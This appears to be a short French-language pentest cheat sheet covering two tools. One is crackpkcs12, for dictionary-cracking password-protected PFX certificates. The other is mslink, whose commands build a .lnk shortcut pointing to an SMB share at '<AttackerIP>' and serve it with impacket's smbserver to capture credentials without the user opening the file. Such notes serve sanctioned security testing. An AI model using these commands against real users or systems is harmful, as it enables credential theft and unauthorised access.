# Tools

- [crackpkcs12](#crackpkcs12)
- [mslink](#mslink)


## crackpkcs12

Crackpkcs12 est un outil qui permet de cracker des certificat protégé par mots de passe.
<br>
<br>
Exemple d'utilisation:

```
crackpkcs12 -d /usr/share/wordlists/rockyou.txt cert.pfx
```

URL:
```
https://sourceforge.net/projects/crackpkcs12/files/
```
Installation:
```
tar -xf crackpkcs12*
cd crackpkcs12*
./configure
make
sudo make install
```
<br>
<br>

## mslink

mslink permet de créer un raccourci qui doit pointer vers un partage SMB par exemple, l'avantage est que l'utilisateur n'a pas besoin de le lancer pour qu'il fonctionne.

```
./mslink.sh -l notimportant -n shortcut -i \\\\<AttackerIP>\\<ShareName> -o shortcut.lnk
```

URL:
```
http://www.mamachine.org/mslink/index.en.html
```
Suite (exemple):
```
python3 /opt/impacket/examples/smbserver.py -smb2support <ShareName> .
```

Peut également être réaliser avec Responder
